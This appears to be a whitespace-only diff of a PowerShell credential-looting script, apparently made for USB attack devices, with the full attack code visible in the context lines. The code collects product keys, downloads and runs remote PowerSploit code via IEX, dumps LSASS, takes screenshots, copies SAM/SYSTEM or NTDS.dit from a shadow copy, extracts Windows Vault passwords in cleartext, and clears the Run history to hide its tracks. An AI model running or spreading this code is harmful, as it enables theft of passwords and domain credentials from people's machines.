@@ -85,7 +85,7 @@ if ($SYSTEMINFO -eq "Y") {
 # CREATE BASIC SYSTEM INFORMATION
 #-----------------------------------------------------------
 
-"BIOS Informatie:" >> "$LootDir\computer_info.txt" 
+"BIOS Informatie:" >> "$LootDir\computer_info.txt"
 Get-WmiObject -Class Win32_BIOS -ComputerName . >> "$LootDir\computer_info.txt"
 
 "Basic Computer Info:" >> "$LootDir\computer_info.txt"
@@ -98,8 +98,8 @@ Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, Version, OSArchi
 wmic path softwarelicensingservice get OA3xOriginalProductKey  >> "$LootDir\computer_info.txt"
 
 "Office Version + Serial Key:" >> "$LootDir\computer_info.txt"
-Try { 
-    Switch ((Get-WmiObject Win32_Processor).AddressWidth) { 
+Try {
+    Switch ((Get-WmiObject Win32_Processor).AddressWidth) {
           32 {$Path = "hklm:\software\microsoft\office" }
           64 {$Path = "hklm:\software\Wow6432Node\microsoft\office"}
         }
@@ -201,7 +201,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafi
 
 if ($LSASSDUMP -eq "Y") {
 #-----------------------------------------------------------
-# WINDOWS PASSWORDS MEMORY LSASS DUMP 
+# WINDOWS PASSWORDS MEMORY LSASS DUMP
 # All credits for this awesome script go to the creator of "Out-Minidump" - Matthew Graeber
 #-----------------------------------------------------------
 
@@ -285,59 +285,59 @@ if ($TAKESCREENSHOT -eq "Y") {
 # TAKE SCREENSHOT
 #-----------------------------------------------------------
 
-param(            
-  [string]$Width,            
-  [string]$Height,            
-  [String]$FileName = "Screenshot"            
+param(
+  [string]$Width,
+  [string]$Height,
+  [String]$FileName = "Screenshot"
 
-)            
+)
 
-#Function to take screenshot. This function takes the width and height of the screen that has            
-#to be captured            
+#Function to take screenshot. This function takes the width and height of the screen that has
+#to be captured
 
-function Take-Screenshot{            
-[cmdletbinding()]            
-param(            
- [Drawing.Rectangle]$bounds,             
- [string]$path            
-)             
-   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height            
-   $graphics = [Drawing.Graphics]::FromImage($bmp)            
-   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)            
-   $bmp.Save($path)            
-   $graphics.Dispose()            
-   $bmp.Dispose()            
-}                      
+function Take-Screenshot{
+[cmdletbinding()]
+param(
+ [Drawing.Rectangle]$bounds,
+ [string]$path
+)
+   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+   $graphics = [Drawing.Graphics]::FromImage($bmp)
+   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+   $bmp.Save($path)
+   $graphics.Dispose()
+   $bmp.Dispose()
+}
 
-function Get-ScreenResolution {            
- $Screens = [system.windows.forms.screen]::AllScreens                        
- foreach ($Screen in $Screens) {            
-  $DeviceName = $Screen.DeviceName            
-  $Width  = $Screen.Bounds.Width            
-  $Height  = $Screen.Bounds.Height            
-  $IsPrimary = $Screen.Primary                        
-  $OutputObj = New-Object -TypeName PSobject            
-  $OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName            
-  $OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width            
-  $OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height            
-  $OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary            
-  $OutputObj                        
- }            
-}            
+function Get-ScreenResolution {
+ $Screens = [system.windows.forms.screen]::AllScreens
+ foreach ($Screen in $Screens) {
+  $DeviceName = $Screen.DeviceName
+  $Width  = $Screen.Bounds.Width
+  $Height  = $Screen.Bounds.Height
+  $IsPrimary = $Screen.Primary
+  $OutputObj = New-Object -TypeName PSobject
+  $OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName
+  $OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width
+  $OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height
+  $OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary
+  $OutputObj
+ }
+}
 
-[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")            
-[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")            
+[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
 
-if(!($width -and $height)) {            
+if(!($width -and $height)) {
 
- $screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}            
- $Width = $screen.Width            
- $Height = $screen.height            
-}            
+ $screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}
+ $Width = $screen.Width
+ $Height = $screen.height
+}
 
-$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height)            
+$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height)
 
-Take-Screenshot -Bounds $bounds -Path "$LootDir\screenshot.png" 
+Take-Screenshot -Bounds $bounds -Path "$LootDir\screenshot.png"
 }
 
 
@@ -375,121 +375,121 @@ if ($BACKUPSAMSYSTEM -eq "Y") {
 # BACKUP SYSTEM and SAM or NTDS.dit
 #-----------------------------------------------------------
 
-function Get-PasswordFile {  
-    [CmdletBinding()] 
-    Param 
-    ( 
-        [Parameter(Mandatory = $true, Position = 0)] 
-        [ValidateScript({Test-Path $_ -PathType 'Container'})]  
-        [ValidateNotNullOrEmpty()] 
-        [String]  
+function Get-PasswordFile {
+    [CmdletBinding()]
+    Param
+    (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [ValidateScript({Test-Path $_ -PathType 'Container'})]
+        [ValidateNotNullOrEmpty()]
+        [String]
         $DestinationPath
-    ) 
- 
-        function Copy-RawItem 
-        { 
- 
-        [CmdletBinding()] 
-        [OutputType([System.IO.FileSystemInfo])] 
-        Param ( 
-            [Parameter(Mandatory = $True, Position = 0)] 
-            [ValidateNotNullOrEmpty()] 
-            [String] 
-            $Path, 
- 
-            [Parameter(Mandatory = $True, Position = 1)] 
-            [ValidateNotNullOrEmpty()] 
-            [String] 
-            $Destination, 
- 
-            [Switch] 
-            $FailIfExists 
-        ) 
- 
-        # Get a reference to the internal method - Microsoft.Win32.Win32Native.CopyFile() 
-        $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')} 
-        $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native') 
-        $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static'))  
- 
-        # Perform the copy 
-        $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists']))) 
- 
-        $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
- 
-        if ($CopyResult -eq $False -and $HResult -ne 0) 
-        { 
-            # An error occured. Display the Win32 error set by CopyFile 
-            throw ( New-Object ComponentModel.Win32Exception ) 
-        } 
-        else 
-        { 
-            Write-Output (Get-ChildItem $Destination) 
-        } 
-    } 
-  
+    )
+
+        function Copy-RawItem
+        {
+
+        [CmdletBinding()]
+        [OutputType([System.IO.FileSystemInfo])]
+        Param (
+            [Parameter(Mandatory = $True, Position = 0)]
+            [ValidateNotNullOrEmpty()]
+            [String]
+            $Path,
+
+            [Parameter(Mandatory = $True, Position = 1)]
+            [ValidateNotNullOrEmpty()]
+            [String]
+            $Destination,
+
+            [Switch]
+            $FailIfExists
+        )
+
+        # Get a reference to the internal method - Microsoft.Win32.Win32Native.CopyFile()
+        $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')}
+        $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native')
+        $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static'))
+
+        # Perform the copy
+        $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists'])))
+
+        $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+        if ($CopyResult -eq $False -and $HResult -ne 0)
+        {
+            # An error occured. Display the Win32 error set by CopyFile
+            throw ( New-Object ComponentModel.Win32Exception )
+        }
+        else
+        {
+            Write-Output (Get-ChildItem $Destination)
+        }
+    }
+
     #Check for admin rights
     if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
     {
         Write-Error "Not running as admin. Run the script with elevated credentials"
         Return
     }
-        
-    #Get "vss" service startup type 
-    $VssStartMode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode 
-    if ($VssStartMode -eq "Disabled") {Set-Service vss -StartUpType Manual} 
- 
-    #Get "vss" Service status and start it if not running 
-    $VssStatus = (Get-Service vss).status  
-    if ($VssStatus -ne "Running") {Start-Service vss} 
- 
-        #Check to see if we are on a DC 
-        $DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole 
-        $IsDC = $False 
-        if ($DomainRole -gt 3) { 
-            $IsDC = $True 
-            $NTDSLocation = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\services\NTDS\Parameters)."DSA Database File" 
-            $FileDrive = ($NTDSLocation).Substring(0,3) 
-        } else {$FileDrive = $Env:HOMEDRIVE + '\'} 
-     
-        #Create a volume shadow filedrive 
-        $WmiClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy" 
-        $ShadowCopy = $WmiClass.create($FileDrive, "ClientAccessible") 
-        $ReturnValue = $ShadowCopy.ReturnValue 
- 
-        if ($ReturnValue -ne 0) { 
-            Write-Error "Shadow copy failed with a value of $ReturnValue" 
-            Return 
-        }  
-     
-        #Get the DeviceObject Address 
-        $ShadowID = $ShadowCopy.ShadowID 
-        $ShadowVolume = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $ShadowID}).DeviceObject 
-     
-            #If not a DC, copy System and SAM to specified directory 
-            if ($IsDC -ne $true) { 
- 
-                $SamPath = Join-Path $ShadowVolume "\Windows\System32\Config\sam"  
-                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system" 
- 
-                #Utilizes Copy-RawItem from Matt Graeber 
-                Copy-RawItem $SamPath "$DestinationPath\sam" 
-                Copy-RawItem $SystemPath "$DestinationPath\system" 
-            } else { 
-             
-                #Else copy the NTDS.dit and system files to the specified directory             
-                $NTDSPath = Join-Path $ShadowVolume "\Windows\NTDS\NTDS.dit"  
-                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system" 
- 
-                Copy-RawItem $NTDSPath "$DestinationPath\ntds" 
-                Copy-RawItem $SystemPath "$DestinationPath\system" 
-            }     
-     
-        #Return "vss" service to previous state 
-        If ($VssStatus -eq "Stopped") {Stop-Service vss} 
-        If ($VssStartMode -eq "Disabled") {Set-Service vss -StartupType Disabled} 
+
+    #Get "vss" service startup type
+    $VssStartMode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode
+    if ($VssStartMode -eq "Disabled") {Set-Service vss -StartUpType Manual}
+
+    #Get "vss" Service status and start it if not running
+    $VssStatus = (Get-Service vss).status
+    if ($VssStatus -ne "Running") {Start-Service vss}
+
+        #Check to see if we are on a DC
+        $DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole
+        $IsDC = $False
+        if ($DomainRole -gt 3) {
+            $IsDC = $True
+            $NTDSLocation = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\services\NTDS\Parameters)."DSA Database File"
+            $FileDrive = ($NTDSLocation).Substring(0,3)
+        } else {$FileDrive = $Env:HOMEDRIVE + '\'}
+
+        #Create a volume shadow filedrive
+        $WmiClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy"
+        $ShadowCopy = $WmiClass.create($FileDrive, "ClientAccessible")
+        $ReturnValue = $ShadowCopy.ReturnValue
+
+        if ($ReturnValue -ne 0) {
+            Write-Error "Shadow copy failed with a value of $ReturnValue"
+            Return
+        }
+
+        #Get the DeviceObject Address
+        $ShadowID = $ShadowCopy.ShadowID
+        $ShadowVolume = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $ShadowID}).DeviceObject
+
+            #If not a DC, copy System and SAM to specified directory
+            if ($IsDC -ne $true) {
+
+                $SamPath = Join-Path $ShadowVolume "\Windows\System32\Config\sam"
+                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system"
+
+                #Utilizes Copy-RawItem from Matt Graeber
+                Copy-RawItem $SamPath "$DestinationPath\sam"
+                Copy-RawItem $SystemPath "$DestinationPath\system"
+            } else {
+
+                #Else copy the NTDS.dit and system files to the specified directory
+                $NTDSPath = Join-Path $ShadowVolume "\Windows\NTDS\NTDS.dit"
+                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system"
+
+                Copy-RawItem $NTDSPath "$DestinationPath\ntds"
+                Copy-RawItem $SystemPath "$DestinationPath\system"
+            }
+
+        #Return "vss" service to previous state
+        If ($VssStatus -eq "Stopped") {Stop-Service vss}
+        If ($VssStartMode -eq "Disabled") {Set-Service vss -StartupType Disabled}
 }
 
-Get-PasswordFile "$LootDir" 
+Get-PasswordFile "$LootDir"
 
 }
 
@@ -501,7 +501,7 @@ if ($PASSWORDVAULTDUMP -eq "Y") {
 
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault
-$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize >> "$LootDir\windowsvaultcredentials.txt" 
+$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize >> "$LootDir\windowsvaultcredentials.txt"
 }
 
 
@@ -545,9 +545,9 @@ if ($TEMP -eq "Y") {
 }
 
 }
-	
-	
-	
+
+
+
 if ($CLEARTRACKS -eq "Y") {
 #-----------------------------------------------------------
 # CLEAR TRACKS
@@ -555,6 +555,3 @@ if ($CLEARTRACKS -eq "Y") {
 
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
 }
-
-
-
